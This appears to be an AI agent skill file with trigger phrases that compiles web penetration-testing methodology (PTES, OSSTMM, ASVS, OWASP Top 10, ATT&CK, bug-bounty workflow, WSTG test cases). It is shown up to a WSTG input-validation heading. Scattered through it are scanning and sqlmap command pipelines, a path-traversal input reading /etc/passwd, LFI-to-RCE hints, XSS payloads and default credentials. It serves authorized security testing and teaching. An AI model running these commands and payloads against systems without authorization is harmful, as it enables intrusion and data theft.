---
name: wstg-web-hacking
description: "Master Web Security Testing & Penetration Testing Skill — combines OWASP WSTG v4.2, PTES, OSSTMM, OWASP ASVS, MITRE ATT&CK, Bug Bounty Methodology, Web Application Hacker's Handbook, and modern vulnerability research into ONE comprehensive reference. Covers reconnaissance, vulnerability discovery, exploitation, post-exploitation, and reporting across 12 WSTG categories, 150+ tools, 50+ vulnerability classes, and 5 reconnaissance tiers. Triggers: 'wstg', 'web hacking', 'penetration testing', 'pentest', 'web security test', 'OWASP', 'web app pentest', 'web application testing', 'security testing', 'bug bounty', 'vulnerability assessment', 'red team', 'purple team', 'full pentest', 'web security assessment'"
---
# Master Web Security Testing & Penetration Testing Skill

## Overview

This skill is the definitive reference for web application penetration testing, integrating:

| Framework | Type | Focus | When to Use |
|-----------|------|-------|-------------|
| **OWASP WSTG v4.2** | Step-by-step test guide | 12 categories, 100+ specific test cases | Primary testing procedures reference |
| **PTES** | Engagement lifecycle | 7 phases from pre-engagement to reporting | Scoping and project structure |
| **OSSTMM** | Scientific/metrics-based | 5 channels, RAV quantitative scoring | Severity measurement and compliance |
| **OWASP ASVS** | Verification standard | 3 levels, 20 categories of requirements | Scoping test depth (L1/L2/L3) |
| **OWASP Top 10:2021** | Risk ranking | Top 10 web app security risks | Vulnerability classification and reporting |
| **MITRE ATT&CK** | Adversary TTP taxonomy | 15 tactics, 200+ techniques | Mapping findings to real-world threats |
| **Bug Bounty Methodology** | Recon-first practical workflow | Asset discovery to PoC | High-efficiency, scope-limited testing |
| **WAHH Methodology** | Deep-dive conceptual | Core defense mechanisms + logic flaws | Understanding *why* vulnerabilities exist |

### Framework Relationship Diagram

```
RISK MANAGEMENT: NIST CSF 2.0 / ISO 27001
    |
TESTING LIFECYCLE: PTES (Pre-Engagement -> Reporting)
    |
TESTING SCOPE & RIGOR: OSSTMM (channels) + ASVS (L1/L2/L3)
    |
TECHNICAL PROCEDURES:
    |-- OWASP WSTG (step-by-step: exactly WHAT and HOW to test)
    |-- WAHH Methodology (deep concept: WHY vulnerabilities exist)
    |-- Bug Bounty Methodology (recon-first: efficient asset discovery)
    |
VULNERABILITY TAXONOMIES: OWASP Top 10 + MITRE ATT&CK TTPs + CWE
    |
EXECUTION MODES: Red Team (goal-based stealth) vs Pentest (coverage)
```

### Testing Approach Distinctions

**Passive Testing**: Reconnaissance and information gathering WITHOUT direct interaction with the target. Includes search engine discovery, metadata analysis, source code review, traffic interception. Does NOT send requests to the target.

**Active Testing**: Direct interaction through crafted requests, payload injection, behavior manipulation. May alter application state. Requires proper authorization.

**Black-Box**: No prior knowledge of internal structure. Simulates external attacker.

**Gray-Box**: Partial knowledge (credentials, API docs, non-production access). Deeper coverage.

**White-Box**: Full source code access. Code review + architecture analysis.

---

## Part 1: PTES — Penetration Testing Execution Standard

### Phase 1: Pre-Engagement Interactions
- Define scope, rules of engagement, legal authorization
- Establish statement of work (SoW), timeline, deliverables
- Identify emergency contacts, escalation paths
- Confirm testing windows and excluded systems
- Document acceptance criteria

### Phase 2: Intelligence Gathering
**OSINT Collection**:
- Search engine discovery (Google/Bing/Baidu/Shodan)
- Certificate transparency logs (crt.sh)
- DNS interrogation (dig, nslookup, host)
- WHOIS lookups, reverse WHOIS
- Social media profiling, job postings analysis
- GitHub/Code repository search for secrets
- Wayback Machine for historical content
- Email harvesting (theHarvester, Hunter.io)

**Network Reconnaissance**:
- ASN/IP range discovery (BGP.he.net, Amass)
- DNS zone transfers (if misconfigured)
- Reverse DNS lookups
- Cloud asset enumeration (S3, Azure Blob, GCP buckets)

**Technical Enumeration**:
- Subdomain enumeration (passive: subfinder, assetfinder, crt.sh)
- Technology stack fingerprinting (Wappalyzer, whatweb, BuiltWith)
- Web server identification (banner grabbing, error pages)

### Phase 3: Threat Modeling
- Map gathered intelligence to threat actor profiles
- Identify attack surfaces and trust boundaries
- Prioritize attack vectors by likelihood and business impact
- Use STRIDE/PASTA/TRIKE methodology
- Create data flow diagrams marking trust boundaries

### Phase 4: Vulnerability Analysis
- Active service scanning (nmap -sV, naabu)
- Automated vulnerability scanning (nuclei, nikto, Nessus)
- Manual inspection of identified services
- Configuration review against CIS benchmarks
- Classify findings by EXPLOITABILITY (not just existence):
  - Confirmed: Working exploit demonstrated
  - Probable: Strong indicators, exploitation likely
  - Possible: Theoretical based on version/config
  - Informational: Interesting but not directly exploitable

### Phase 5: Exploitation
- Controlled, authorized exploitation to confirm vulnerability
- Precision over brute force — target specific findings
- Document exact reproduction steps
- Chain vulnerabilities for greater impact
- Stop at proof-of-concept unless deeper testing authorized

### Phase 6: Post-Exploitation
- Lateral movement assessment
- Privilege escalation paths
- Data access analysis (what sensitive data is reachable?)
- Persistence evaluation (can attacker maintain access?)
- Pivoting and tunneling assessment
- Cleanup and artifact removal
- Quantify business risk from post-exploitation findings

### Phase 7: Reporting
- Executive Summary (business context, key risks, strategic recommendations)
- Technical Findings (ref ID, description, reproduction steps, impact, remediation)
- Risk ratings with justification
- Remediation roadmap prioritized by risk
- Appendices: methodology, tools used, scope details, test checklist

---

## Part 2: OSSTMM — Open Source Security Testing Methodology Manual

### Five Testing Channels
| Channel | Scope |
|---------|-------|
| Human Security (HUMSEC) | Social engineering, staff awareness, policies |
| Physical Security (PHYSSEC) | Access controls, building security, locks, perimeters |
| Wireless Security (SPECSEC) | WiFi, Bluetooth, RFID, cellular |
| Telecommunications (COMSEC) | VoIP, PBX, fax, modems |
| Data Networks (DATASEC) | Network infrastructure, web applications, databases |

### RAV (Risk Assessment Value)
OSSTMM provides quantitative security measurement through RAVs:
- **Porosity**: Total number of findings (inputs, outputs, interactions) in scope
- **Controls**: Security mechanisms in place
- **Limitations**: Testing boundaries imposed by scope/contracts
- **Attack Surface** = Porosity + Controls + Limitations
- **True Protection** = Controls + Limitations - Porosity
- Target RAV: 100 (perfect balance), >100 (over-controlled), <100 (under-controlled)

### Control Classes
**Class A (Interactive Controls)**: Authentication, Indemnification, Subjugation, Continuity, Resilience
**Class B (Process Controls)**: Non-repudiation, Confidentiality, Privacy, Integrity, Alarm

### Using RAV for Severity Scoring
- Map each finding to a porosity increase
- Calculate the resulting True Protection delta
- Use delta magnitude to assign: Critical (>20 drop), High (10-20), Medium (5-10), Low (<5), Info (no change)

---

## Part 3: OWASP ASVS — Application Security Verification Standard

### Three Verification Levels
| Level | Name | Requirements | Testing Depth |
|-------|------|-------------|---------------|
| **L1** | Low Assurance | ~20% of ASVS | Automated tools + manual black-box, no source access needed |
| **L2** | Standard (Recommended) | ~70% of ASVS | Requires docs, source code access, developer interviews |
| **L3** | High Assurance | 100% of ASVS | Full architectural review, deep source audit, threat modeling |

### ASVS Categories (V1-V14)
| Chapter | Domain | Key Requirements |
|---------|--------|------------------|
| V1 | Architecture, Design, Threat Modeling | Security architecture documentation, threat models |
| V2 | Authentication | Password policy, MFA, credential recovery, brute-force protection |
| V3 | Session Management | Token generation, cookie security, logout, timeout |
| V4 | Access Control | RBAC enforcement, IDOR prevention, least privilege, CORS |
| V5 | Validation, Sanitization, Encoding | Input validation, output encoding, parameterized queries |
| V6 | Stored Cryptography | Key management, algorithm selection, random number generation |
| V7 | Error Handling & Logging | Error disclosure prevention, comprehensive logging |
| V8 | Data Protection | Client-side data storage, sensitive data in transit |
| V9 | Communications | TLS configuration, certificate validation, HSTS |
| V10 | Malicious Code | Code integrity, supply chain, CI/CD pipeline security |
| V11 | Business Logic | Abuse case testing, workflow validation, rate limiting |
| V12 | Files & Resources | File upload validation, path traversal, resource protection |
| V13 | API & Web Services | REST/GraphQL/SOAP security, API authentication |
| V14 | Configuration | Secure defaults, hardening, cloud configuration |

**Level Selection Guide**:
- L1: Low-risk internal apps, portfolio-wide baseline scanning
- L2: Apps handling PII, financial data, healthcare info (HIPAA), business-critical functions
- L3: Military, critical infrastructure, high-value financial transactions, medical devices

---

## Part 4: OWASP Top 10:2021

| Rank | Category | CWEs | Key Examples |
|------|----------|------|-------------|
| **A01** | Broken Access Control | 34 | IDOR, privilege escalation, forced browsing, CORS misconfig, missing function-level access control |
| **A02** | Cryptographic Failures | 29 | Weak encryption (MD5/SHA1), hardcoded secrets, missing TLS, plaintext data storage, weak key generation |
| **A03** | Injection | 33 | SQL, NoSQL, OS command, LDAP, template injection — **XSS moved here from 2017** |
| **A04** | Insecure Design (NEW) | 40 | Missing threat modeling, flawed business logic, insecure auth flows, no rate limiting, missing security requirements |
| **A05** | Security Misconfiguration | 20 | Default credentials, verbose errors, misconfigured HTTP headers, open cloud storage, unnecessary features enabled |
| **A06** | Vulnerable & Outdated Components | 3 | Known CVE in libraries/frameworks, unsupported software, unpatched systems, no SBOM |
| **A07** | Identification & Auth Failures | 7 | Weak passwords, no MFA, session fixation, credential stuffing, missing brute-force protection |
| **A08** | Software & Data Integrity Failures | 10 | Insecure deserialization, unverified updates, CI/CD pipeline poisoning, insecure dependencies |
| **A09** | Security Logging & Monitoring Failures | 4 | Insufficient logging, no anomaly detection, missing alerts, log injection, no audit trail |
| **A10** | Server-Side Request Forgery (NEW) | 1 | Cloud metadata API access, internal service scanning, blind SSRF, protocol smuggling (file://, gopher://) |

**Key Changes from 2017**: XSS merged into Injection (A03). New categories: Insecure Design (A04), SSRF (A10). Cryptographic Failures renamed from Sensitive Data Exposure (root cause over symptom).

---

## Part 5: MITRE ATT&CK for Web Applications

### Key Web-Relevant Techniques

| Tactic | Technique ID | Technique | Web Context |
|--------|-------------|-----------|-------------|
| Reconnaissance | T1593 | Search Open Websites/Domains | Google dorking, crt.sh, Shodan |
| Reconnaissance | T1594 | Search Victim-Owned Websites | JS source analysis, exposed endpoints |
| Initial Access | **T1190** | Exploit Public-Facing Application | **PRIMARY web attack vector** — SQLi, RCE, auth bypass |
| Initial Access | T1189 | Drive-by Compromise | Malvertising, watering hole attacks |
| Execution | T1059 | Command & Scripting Interpreter | Web shells, SSTI, command injection |
| Execution | T1648 | Serverless Execution | Cloud function trigger via API |
| Persistence | T1505.003 | Web Shell | Upload/creation of web-accessible shells |
| Credential Access | **T1539** | Steal Web Session Cookie | XSS-based cookie theft, session hijacking |
| Credential Access | **T1606** | Forge Web Credentials | JWT manipulation, SAML token forgery |
| Credential Access | T1110 | Brute Force | Login brute-force, credential stuffing |
| Defense Evasion | T1556 | Modify Authentication Process | MFA bypass, password reset manipulation |
| Discovery | T1082 | System Information Discovery | Error-based info disclosure |
| Collection | T1213 | Data from Information Repositories | IDOR-based data access |
| C2 | T1071.001 | Web Protocols | HTTPS beaconing, domain fronting |
| Exfiltration | T1567 | Exfiltration Over Web Service | Data exfil via HTTP POST to attacker server |
| Impact | T1491 | Defacement | Web page defacement |

---

## Part 6: Bug Bounty Methodology (2026)

### Phase 0 — Scope Analysis
- Read program rules thoroughly (in-scope/out-of-scope, bounty table, prohibited techniques)
- Classify target: Wildcard domain / Medium (specific domains) / Narrow (single app)
- Plan attack surface before touching any tool
- Create scope file for tool filtering

### Phase 1 — Passive Reconnaissance (ZERO target interaction)
```
# Certificate Transparency — highest-value passive source
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Passive subdomain aggregators
subfinder -d example.com -silent
assetfinder --subs-only example.com
chaos -d example.com -silent

# Historical URLs — forgotten endpoints
gau -subs example.com | sort -u
waybackurls example.com | sort -u

# Google dorking
site:*.example.com -www
site:example.com ext:php | ext:asp | ext:jsp
site:example.com inurl:admin | inurl:login | inurl:dev
site:example.com filetype:pdf | filetype:sql | filetype:env

# GitHub secret hunting
# Search for: api_key, secret, password, token, BEGIN RSA
# Organization-specific: "example.com" password OR secret OR token

# Cloud asset enumeration
cloud_enum -k example.com
```

### Phase 2 — Active Enumeration
```
# DNS resolution & HTTP probing
cat subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect -cdn -json

# Port scanning
naabu -host target.com -top-ports 1000 | nmap -sV -iL -

# Screenshot for visual review
gowitness file -f live_subs.txt

# Virtual host discovery
ffuf -w subdomains.txt -u http://TARGET_IP -H "Host: FUZZ.example.com" -fc 200

# Subdomain takeover check — do this FIRST (instant P1)
nuclei -t ~/nuclei-templates/http/takeovers/ -l live_subs.txt
subzy run --targets live_subs.txt
```

### Phase 3 — Content & Parameter Discovery
```
# Directory brute-force
ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 2

# JS analysis pipeline
katana -u https://target.com -jc -d 3 | grep '.js$' | sort -u > js.txt
# Extract endpoints & secrets
cat js.txt | while read url; do curl -s "$url"; done | jsluice
# Check for source maps
cat js.txt | sed 's/$/.map/' | httpx -silent

# Parameter discovery
arjun -u https://target.com/endpoint
# Historical parameter mining
gau target.com | gf interesting-params | sort -u

# API discovery
gau target.com | grep -E 'api|v1|v2|graphql|swagger' | sort -u
```

### Phase 4 — Vulnerability Testing (Ebb & Flow Model)
```
# The Ebb & Flow model: test 3-5 vectors → return to recon → repeat

# Priority-ordered checks:
# 1. Subdomain takeover → instant P1
nuclei -t ~/nuclei-templates/http/takeovers/ -l subs.txt
# 2. Cloud misconfig → exposed S3/blobs
s3scanner scan --domains subs.txt
# 3. SSRF → cloud metadata access
# Test all URL/redirect parameters for SSRF
# 4. Exposed admin panels → from screenshots
# 5. JS secrets → API keys, tokens, internal endpoints
trufflehog filesystem ./js_dumps/
# 6. CORS misconfiguration
nuclei -t ~/nuclei-templates/http/cors/ -l live_subs.txt
# 7. XSS → reflected in params
dalfox file urls_with_params.txt
# 8. SQLi
sqlmap -m urls_with_params.txt --batch --level 2
# 9. IDOR → requires auth, test every object ID
# 10. Open Redirect
# 11. Business logic → manual, no automation replaces thinking
```

### Phase 5 — Exploitation & PoC
- Reproduce reliably (minimum 3 times)
- Document every step with screenshots
- Chain bugs for higher severity (e.g., XSS + CSRF = account takeover)
- Escalate: Open Redirect + OAuth = token theft; SSRF + IMDS = cloud takeover
- Clean, minimal PoC that proves impact without causing harm

### Phase 6 — Reporting
- Title: [Vulnerability Type] in [Component] leading to [Impact]
- CWE mapping + CVSS score (use FIRST calculator)
- Clear reproduction steps (copy-paste ready)
- Impact statement in business terms
- Remediation specific to the technology stack

---

## Part 7: Web Application Hacker's Handbook Methodology

### 1. Map the Application
- **1a. Map visible content**: Browse all functionality, spider, review sitemap.xml
- **1b. Discover hidden/default content**: Directory brute-force, Google dorks, Wayback Machine, content discovery with common wordlists
- **1c. Identify entry points**: URL parameters, POST body fields, HTTP headers, cookies, file upload parameters, WebSocket messages
- **1d. Map the attack surface**: Technology identification, server-side vs client-side components, third-party integrations, API endpoints

### 2. Test Core Defense Mechanisms
- **2a. Authentication**: Password quality, username enumeration, account recovery, remember-me, impersonation, multi-stage mechanisms, fail-open conditions
- **2b. Session handling**: Token meaning/encoding, token predictability, insecure transmission, token disclosure in logs, session-to-user mapping, session termination, session fixation, CSRF, cookie scope
- **2c. Access controls**: Understand requirements, multi-account testing, parameter-based controls (role=admin), Referer-based controls, forced browsing of privileged pages
- **2d. Client-side controls**: Hidden form fields, disabled elements, client-side validation, thick-client components (Java/ActiveX/Flash)

### 3. Vulnerability Probing
- **3a. Input-based**: SQL injection (all DB types), XSS (reflected/stored/DOM), OS command injection, path traversal, file inclusion (LFI/RFI), XXE, HTTP header injection
- **3b. Function-specific**: SMTP injection, LDAP injection, XPath injection, SOAP injection, template injection
- **3c. Client-side attacks**: Open redirect, client-side URL redirect, CSS injection, HTML injection
- **3d. Native software flaws**: Buffer overflow, integer bugs, format string vulnerabilities

### 4. Test Business Logic
- Multi-stage process flaws (skip steps, reorder, repeat)
- Incomplete input handling (truncation, null bytes, encoding)
- Trust boundary violations (client-supplied price/quantity/role)
- Transaction logic manipulation (negative values, race conditions)
- Race conditions (parallel requests, TOCTOU)

### 5. Assess Application Hosting
- Shared hosting segregation (access other tenants' data?)
- ASP-hosted application isolation
- Web server vulnerabilities (default creds, dangerous HTTP methods, proxy functionality)
- Virtual hosting misconfiguration
- Default content and sample applications

---

## Part 8: WSTG v4.2 — Complete Test Categories

### 8.1 Information Gathering (WSTG-INFO)

#### WSTG-INFO-01: Search Engine Discovery Reconnaissance
**Summary**: Use search engines to discover sensitive information about the target exposed through indexed content, cached pages, and search dorks.
**Test Objectives**: Identify exposed design and configuration information, sensitive files, and leaked data.
**How to Test**:
```
# Search engines to use: Google, Bing, Baidu, DuckDuckGo, Shodan, Startpage
# Key operators:
site:example.com                         # All indexed pages
site:example.com inurl:admin             # Admin pages
site:example.com intitle:"index of"      # Directory listings
site:example.com ext:sql | ext:bak | ext:old  # Backup/sensitive files
site:example.com filetype:pdf            # Documents
cache:example.com                        # Cached content
# Google Hacking Database: exploit-db.com/google-hacking-database
# Categories: Footholds, Usernames, Sensitive Directories, Vulnerable Files, Error Messages, Passwords
```
**Tools**: Google, Bing, Baidu, DuckDuckGo, Shodan, Internet Archive Wayback Machine, Google Hacking Database

#### WSTG-INFO-02: Fingerprint Web Server
**Summary**: Identify web server type and version through banner grabbing, malformed requests, and error page analysis.
**How to Test**:
- **Banner grabbing**: Examine Server header in HTTP response (Apache, nginx, IIS, lighttpd)
- **Malformed requests**: Send invalid HTTP method to trigger default error pages revealing server identity
- **Header ordering analysis**: Different servers order headers differently (Apache: Date→Server→Last-Modified; nginx: Server→Date→Content-Type)
- **Automated tools**: nmap -sV, nikto, Netcraft, whatweb
- Even when Server header is obscured, error page content and header ordering can reveal the server
**Tools**: telnet, curl, openssl s_client, nmap, nikto, Netcraft

#### WSTG-INFO-03: Review Webserver Metafiles
**Summary**: Analyze robots.txt, sitemap.xml, security.txt, humans.txt, META tags for information leakage.
**How to Test**:
- **robots.txt**: Check `/robots.txt` for Disallow entries revealing hidden/sensitive paths
- **sitemap.xml**: Check `/sitemap.xml` for all published URLs, including sub-sitemaps
- **security.txt**: Check `/.well-known/security.txt` for security contacts, policies, bug bounty info
- **humans.txt**: Check `/humans.txt` for team info, career pages, internal references
- **.well-known/**: Check IANA registry for other standardized endpoints
- **META tags**: Review HTML source for robots, author, keywords, refresh, PICS/POWDER tags
**Tools**: curl, wget, browser View Source, Burp Suite, ZAP

#### WSTG-INFO-04: Enumerate Applications on Webserver
**Summary**: Discover ALL web applications hosted on the target infrastructure, including non-standard ports and virtual hosts.
**How to Test**:
- **DNS zone transfers**: `host -t ns example.com` then attempt `host -l example.com ns1.example.com`
- **Reverse IP lookups**: Domain Tools, Bing (ip:x.x.x.x), DNSstuff
- **Port scanning**: `nmap -Pn -sT -sV -p0-65535 target` — find HTTP on non-standard ports
- **Virtual host enumeration**: DNS PTR records, web-based reverse DNS
- **Content discovery**: Directory brute-force for hidden applications at non-obvious URLs
- **Google dorking**: site:example.com to discover unlinked sub-applications
**Tools**: nslookup, dig, host, nmap, Nikto, Nessus, search engines

#### WSTG-INFO-05: Review Webpage Content for Information Leakage
**Summary**: Examine HTML comments, JavaScript code, and source maps for leaked sensitive information.
**How to Test**:
- **HTML comments**: Search for `<!--` containing SQL queries, passwords, IPs, debug info
- **JavaScript secrets**: Look for hardcoded API keys, credentials, internal endpoints, S3 bucket names
- **Source maps**: Check for `.js.map` files that reconstruct original source code with comments, routes, and internal logic
- **META tags**: Review for author, version, framework, technology information
- **Hidden fields**: Examine form fields for state information, price, quantity, role parameters
- **API key validation**: Found a Google Maps API key? Check restrictions at Google Cloud Console
**Tools**: Browser View Source, curl, wget, Burp Suite, waybackurls, Google Maps API Scanner, KeyHacks

#### WSTG-INFO-06: Identify Application Entry Points
**Summary**: Map ALL data entry points — parameters, headers, cookies, file uploads — before testing begins.
**How to Test**:
- **GET requests**: Identify all query string parameters (after `?`)
- **POST requests**: Identify all body parameters including hidden fields
- **Custom headers**: Note non-standard headers (debug, custom auth tokens)
- **Cookies**: Track Set-Cookie headers, cookie modifications
- **Redirects**: Note 3xx codes and their parameters
- **Error responses**: Identify 403, 500 patterns during normal browsing
- **WebSockets**: Identify ws:// or wss:// connections
- Use intercepting proxy + spreadsheet to catalog ALL parameters
**Tools**: Burp Suite, OWASP ZAP, Fiddler, OWASP Attack Surface Detector

#### WSTG-INFO-07: Map Execution Paths Through Application
**Summary**: Understand the complete flow of the application — all pages, functions, and their relationships.
**How to Test**:
- Spider/crawl the entire application
- Map multi-step processes (checkout, registration, password reset)
- Identify conditional branches based on role/input
- Forced browsing for unlinked content
- Map state transitions and workflow dependencies
**Tools**: Burp Spider, ZAP Spider, Katana, Hakrawler

#### WSTG-INFO-08: Fingerprint Web Application Framework
**Summary**: Identify the web application framework to focus testing on framework-specific vulnerabilities.
**How to Test**:
- HTTP headers: X-Powered-By, X-AspNet-Version, X-Drupal-Cache
- Cookies: PHPSESSID, ASP.NET_SessionId, JSESSIONID, django_language
- HTML markers: generator META tags, WordPress paths, React/Vue data attributes
- File extensions: .php, .aspx, .jsp, .do, .action
- Error messages revealing framework details
- Directory structure patterns
**Tools**: Wappalyzer, whatweb, BuiltWith, Retire.js

#### WSTG-INFO-09: Fingerprint Web Application
**Summary**: Identify specific application versions, components, and plugins.
**How to Test**:
- Version numbers in HTML/CSS/JS comments and paths
- WordPress: /wp-content/plugins/, /wp-content/themes/, readme.html
- Drupal: /CHANGELOG.txt, /core/CHANGELOG.txt
- Known file hashes for specific versions
- Component detection via Wappalyzer/BuiltWith
**Tools**: Wappalyzer, whatweb, wpscan, joomscan, droopescan

#### WSTG-INFO-10: Map Application Architecture
**Summary**: Understand the infrastructure behind the application.
**How to Test**:
- Reverse proxies: Via, X-Forwarded-For, X-Real-IP headers
- Load balancers: BIG-IP cookie, multiple Server headers, session persistence
- CDN detection: CNAME records, CDN-specific headers (CF-Ray, X-Cache)
- Internal vs external separation: different responses from internal IPs
- Database connectivity: error messages revealing DB hostnames/IPs
**Tools**: nmap, dig, curl with custom headers

---

### 8.2 Configuration & Deployment Management (WSTG-CONF)

#### WSTG-CONF-01: Test Network Infrastructure Configuration
Check firewall rules, load balancer configurations, network segmentation. Test for exposed administrative services on non-standard ports. Verify proper network isolation between environments.

#### WSTG-CONF-02: Test Application Platform Configuration
Check for default installations, sample applications, debug modes enabled, unnecessary features. Verify admin consoles are protected. Test for directory listing enabled on web server.

#### WSTG-CONF-03: Test File Extensions Handling
Test how the server handles different file extensions: .bak, .old, .inc, .php~, .swp, .git, .svn. Check if source code is served as plaintext for backup extensions.

#### WSTG-CONF-04: Review Old Backup and Unreferenced Files
Search for archive files (.zip, .tar.gz, .7z), source code backups, editor temporary files. Check for exposed .git directories allowing repository download.

#### WSTG-CONF-05: Enumerate Admin Interfaces
Brute-force common admin paths: /admin, /manager, /phpmyadmin, /wp-admin, /administrator, /panel, /console. Test default credentials against discovered interfaces.

#### WSTG-CONF-06: Test HTTP Methods
Test OPTIONS to discover allowed methods. Test risky methods (PUT, DELETE, TRACE, CONNECT). Test for arbitrary method handling and verb-based authentication bypass (using GET instead of POST).

#### WSTG-CONF-07: Test HTTP Strict Transport Security
Verify HSTS header presence: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`. Check for HTTPS enforcement, mixed content, and HSTS bypass via subdomains.

#### WSTG-CONF-08: Test RIA Cross Domain Policy
Check crossdomain.xml and clientaccesspolicy.xml for overly permissive settings. Verify flash/silverlight cross-domain policies don't allow wildcard origins.

#### WSTG-CONF-09: Test File Permission
Check for directory listing on upload directories. Verify configuration files are not world-readable. Test file access permissions on sensitive paths.

#### WSTG-CONF-10: Test for Subdomain Takeover
Check for dangling DNS records pointing to unclaimed cloud services (AWS S3, Azure, GitHub Pages, Heroku). Use subzy, nuclei takeover templates, dnsReaper.

#### WSTG-CONF-11: Test Cloud Storage
Enumerate cloud storage buckets (S3, Azure Blob, GCP Storage). Test for public read/write access. Check bucket policies and ACLs. Tools: s3scanner, cloud_enum, Prowler.

---

### 8.3 Identity Management Testing (WSTG-IDNT)

#### WSTG-IDNT-01: Test Role Definitions
Verify proper privilege separation between roles. Test that users cannot access functions above their privilege level. Check for missing or overly broad roles.

#### WSTG-IDNT-02: Test User Registration Process
Test for automated/bulk registration. Check email verification bypass. Test duplicate registration handling. Verify CAPTCHA effectiveness if present.

#### WSTG-IDNT-03: Test Account Provisioning Process
Test admin account creation process. Check for bulk user provisioning vulnerabilities. Verify de-provisioning actually removes access. Test for privilege escalation during provisioning.

#### WSTG-IDNT-04: Account Enumeration & Guessable Accounts
Test login error messages for username enumeration (different messages for "user not found" vs "wrong password"). Check password reset for enumeration. Test timing differences. Look for sequential user IDs.

#### WSTG-IDNT-05: Weak or Unenforced Username Policy
Test for predictable username generation (firstname.lastname, employee ID). Check if email-as-username is enforced. Test for username reuse restrictions.

---

### 8.4 Authentication Testing (WSTG-ATHN)

#### WSTG-ATHN-01: Credentials Transport over Encrypted Channel
Verify login forms use HTTPS. Check for mixed content on login pages. Test for credential transmission in URL parameters. Verify SSL/TLS configuration for login endpoints.

#### WSTG-ATHN-02: Default Credentials
Test common default credentials (admin/admin, root/root, guest/guest). Check vendor-specific defaults (tomcat/tomcat, sa/[empty] for databases). Use SecLists default credentials wordlists.

#### WSTG-ATHN-03: Weak Lock Out Mechanism
Test brute-force resistance. Check CAPTCHA implementation and bypass techniques. Verify rate limiting effectiveness. Test lockout duration and reset mechanisms.

#### WSTG-ATHN-04: Bypassing Authentication Schema
Test direct page access without authentication. Parameter modification for auth bypass (admin=true, debug=true). SQL injection in login forms. Session fixation + replay. Forced browsing of authenticated pages.

#### WSTG-ATHN-05: Vulnerable Remember Password
Check "Remember Me" cookie for weak encoding/encryption. Test if cookie can be replayed on different systems. Verify cookie expiration and invalidation.

#### WSTG-ATHN-06: Browser Cache Weaknesses
Test cache-control headers on authenticated pages. Check if sensitive pages are cached (back-button after logout). Verify Cache-Control: no-store, Pragma: no-cache headers.

#### WSTG-ATHN-07: Weak Password Policy
Test minimum password length, complexity requirements. Check for common password blocking. Test credential stuffing resistance. Verify password history enforcement.

#### WSTG-ATHN-08: Weak Security Question/Answer
Test for guessable answers from public information. Check question set for sufficient variety. Verify answer handling (case sensitivity, normalization).

#### WSTG-ATHN-09: Weak Password Change/Reset
Test password reset token for predictability. Check enumeration via password reset (different responses). Verify token expiration and one-time use. Test for Host header injection in reset links.

#### WSTG-ATHN-10: Weaker Authentication in Alternative Channel
Test mobile API endpoints for weaker auth. Check SSO integration for bypass. Test legacy login pages. Verify consistent auth across all channels (web, mobile, API).

---

### 8.5 Authorization Testing (WSTG-ATHZ)

#### WSTG-ATHZ-01: Directory Traversal / File Include
Test path traversal in file parameters: `../../../etc/passwd`, `..\..\..\windows\win.ini`. Try encoded variants: `%2e%2e%2f`, `%252e%252e%252f`. Test null byte injection: `%00`. Test LFI to RCE chains (log poisoning, /proc/self/environ, php:// wrappers).

#### WSTG-ATHZ-02: Bypassing Authorization Schema
Test direct object access without proper authorization. Parameter modification (role=admin, isAdmin=true). Horizontal privilege escalation (access other users' data). Vertical privilege escalation (access admin functions).

#### WSTG-ATHZ-03: Privilege Escalation
Test role modification through request manipulation. Cookie-based privilege escalation (modify role cookie). Test for missing authorization checks on sensitive endpoints. Test multi-step process authorization at each step.

#### WSTG-ATHZ-04: Insecure Direct Object References (IDOR)
Test all object ID parameters (user IDs, order numbers, file IDs). Try sequential/guessable IDs. Test UUID vs integer ID security. Check both authenticated and cross-user access. Test in URLs, POST bodies, and API endpoints.

---

### 8.6 Session Management Testing (WSTG-SESS)

#### WSTG-SESS-01: Session Management Schema
Analyze session token generation: length, character set, entropy. Test token randomness (Burp Sequencer — >100 bits entropy minimum). Check token transmission (cookies vs URL vs hidden fields). Verify new token issued after privilege change (login, role switch).

#### WSTG-SESS-02: Cookies Attributes
Verify HttpOnly flag (prevents JS access). Verify Secure flag (HTTPS only). Verify SameSite attribute (Lax/Strict). Check Domain and Path scope. Verify Expires/Max-Age settings. Test for __Host- and __Secure- prefix usage.

#### WSTG-SESS-03: Session Fixation
Test if pre-login token is accepted after authentication. Check token in URL (PHPSESSID in query string). Test cookie injection capability. Verify new session ID issued on login. Test cross-subdomain session sharing.

#### WSTG-SESS-04: Exposed Session Variables
Check for token in URL, Referer header, or server logs. Test client-side storage (localStorage/sessionStorage) for token storage. Verify tokens not logged. Check WebSocket handshake for token leakage.

#### WSTG-SESS-05: Cross Site Request Forgery (CSRF)
Test state-changing requests for CSRF token requirement. Check token predictability. Test token bypass: remove token, use empty token, use random token, use token from another session. Test SameSite cookie bypass. Check for CSRF on login/logout.

#### WSTG-SESS-06: Logout Functionality
Verify server-side session invalidation. Test cookie clearing after logout. Check back-button after logout (should not show authenticated content). Test multi-tab logout behavior. Check session termination on password change.

#### WSTG-SESS-07: Session Timeout
Test idle timeout (no activity). Test absolute timeout (regardless of activity). Check if session can be extended indefinitely. Verify timeout applies consistently across all pages.

#### WSTG-SESS-08: Session Puzzling
Test session reuse across different application contexts. Check if privilege level is stored client-side in session. Test multi-app session sharing on same domain.

#### WSTG-SESS-09: Session Hijacking
Test token predictability (low entropy). Check for token leakage via XSS, logs, Referer. Verify token binding to IP/User-Agent (or lack thereof). Test token replay across different IPs.

---

### 8.7 Input Validation Testing (WSTG-INPV)

#### WSTG-INPV-01: Reflected Cross Site Scripting
Test all reflected parameters for HTML/JS context injection. Payloads: `<script>alert(1)</script>`, `"><script>alert(1)</script>`, `<img src=x onerror=alert(1)>`. Test all contexts: HTML body, HTML attribute, JavaScript, CSS, URL. Use polyglot payloads: `javascript:alert(1)`, `'"(){};:--><script>alert(1)</script>`. Test encoding bypass: URL encoding, HTML entities, Unicode escapes.

#### WSTG-INPV-02: Stored Cross Site Scripting
Inject payloads into all persistent storage points: comments, profiles, messages, file names, metadata. Test for blind stored XSS (payload stored but you cannot see rendering). Test second-order XSS (payload stored safely, executed in different context). Check admin panels and support tools that display user data.

#### WSTG-INPV-03: HTTP Verb Tampering
